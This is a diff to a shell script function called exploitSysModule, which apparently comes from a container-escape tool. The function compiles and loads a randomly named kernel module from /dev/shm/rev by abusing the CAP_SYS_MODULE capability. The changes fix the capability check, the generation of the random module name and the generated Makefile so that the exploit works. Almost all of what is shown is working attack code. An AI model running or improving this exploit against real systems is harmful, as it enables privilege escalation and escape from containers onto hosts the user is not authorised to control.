@@ -1140,7 +1140,7 @@ exploitSysModule(){
   fi
 
   caps=$(capsh --print)
-  if ! [ $caps =~ "cap_sys_module" ]; then
+  if ! echo "$caps" | grep -qa "cap_sys_module" ; then
     printError "We don't have the SYS_MODULE capability, which is required for this exploit"
     exit 1
   fi
@@ -1155,7 +1155,7 @@ exploitSysModule(){
     exit 1
   fi
   
-  module_name=$(shuf -zer -n10 {a..z} {A..Z}| tr -d '\0')
+  module_name=$(tr -dc A-Za-z </dev/urandom | head -c 13)
   sys_cwd=$(pwd)
 
   mkdir /dev/shm/rev && cd /dev/shm/rev
@@ -1181,8 +1181,12 @@ module_init(${module_name}_init);
 module_exit(${module_name}_exit);
 EOF
 
-cat << EOF > makefile
-  obj-m +=${module_name}.o\nall:\n\tmake -C /lib/modules/$(uname -r)/build M=$(pwd) modules\nclean:\n\tmake -C /lib/modules/$(uname -r)/build M=$(pwd) clean
+cat << EOF > Makefile
+obj-m +=${module_name}.o
+all:
+	make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
+clean:
+	make -C /lib/modules/$(uname -r)/build M=$(pwd) clean
 EOF
 
   printSuccess "Done"
